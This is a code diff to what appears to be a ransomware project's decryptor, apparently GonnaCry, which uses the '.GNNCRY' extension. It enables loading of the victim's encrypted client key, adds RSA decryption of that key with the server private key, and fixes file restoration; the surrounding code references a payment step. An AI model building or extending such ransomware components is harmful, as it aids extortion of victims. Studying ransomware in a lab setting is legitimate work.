@@ -44,7 +44,7 @@ home = environment.get_home_path()
 desktop = environment.get_desktop_path()
 username = environment.get_username()
 
-test_path = "../files2encrypt"
+test_path = "files2encrypt/"
 #ransomware_path = os.path.join(home, ransomware_name)
 ransomware_path = os.path.join(test_path, ransomware_name)
 machine_id = environment.get_unique_machine_id()
@@ -98,17 +98,17 @@ def payment():
 
 
 def menu():
-    # print("{}Importing the encrypted client private key".format(WHITE))
-    # try:
-    #     with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
-    #               'rb') as f:
-    #         encrypted_client_private_key = pickle.load(f)
-    # except IOError:
-    #     print("encrypted client private key not found, \
-    #           I'm sorry. but all your files are lost!")
-    #     sys.exit(-1)
+    print("{}Importing the encrypted client private key".format(WHITE))
+    try:
+        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
+                  'rb') as f:
+            encrypted_client_private_key = pickle.load(f)
+    except IOError:
+        print("encrypted client private key not found, \
+              I'm sorry. but all your files are lost!")
+        sys.exit(-1)
 
-    # print("{}OK{}".format(GREEN, WHITE))
+    print("{}OK{}".format(GREEN, WHITE))
 
     # key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
 
@@ -127,6 +127,37 @@ def menu():
     # print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
     # with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
     #     f.write(client_private_key)
+
+    server_private_key_path = os.path.join("server", "private_key.key")
+
+    try:
+        with open(server_private_key_path, "rb") as f:
+            server_private_key = RSA.importKey(f.read())
+    except Exception as e:
+        print(f"{RED}[!] Failed to load server private key: {e}{END}")
+        sys.exit(-1)
+
+    # Set up decryptor
+    server_private_cipher = PKCS1_OAEP.new(server_private_key)
+
+    # Decrypt the encrypted client private key (chunked)
+    decrypted_chunks = []
+    for idx, chunk in enumerate(encrypted_client_private_key):
+        try:
+            decrypted = server_private_cipher.decrypt(chunk)
+            decrypted_chunks.append(decrypted)
+        except Exception as e:
+            print(f"{RED}[!] Failed to decrypt chunk {idx}: {e}{END}")
+            sys.exit(-1)
+
+    # Combine and save as client_private_key.PEM
+    client_private_key = b"".join(decrypted_chunks)
+
+    with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
+        f.write(client_private_key)
+
+    print(f"{GREEN}Client private key decrypted and written to PEM file.{END}")
+
 
     #Replace server-related code with direct loading of client_private_key.PEM
     print("{}Importing client private RSA key (local){}".format(WHITE, END))
@@ -169,8 +200,9 @@ def menu():
         decrypted_file_content = dec.decrypt(encrypted_file_content)
 
         # save into new file without .GNNCRY extension
-        old_file_name = _[1].replace(".GNNCRY", "")
-        with open(old_file_name, 'w') as f:
+        # old_file_name = _[1].replace(".GNNCRY", "")
+        old_file_name = _[1].decode('utf-8').replace(".GNNCRY", "")
+        with open(old_file_name, 'wb') as f:
             f.write(decrypted_file_content)
         
         # delete old encrypted file
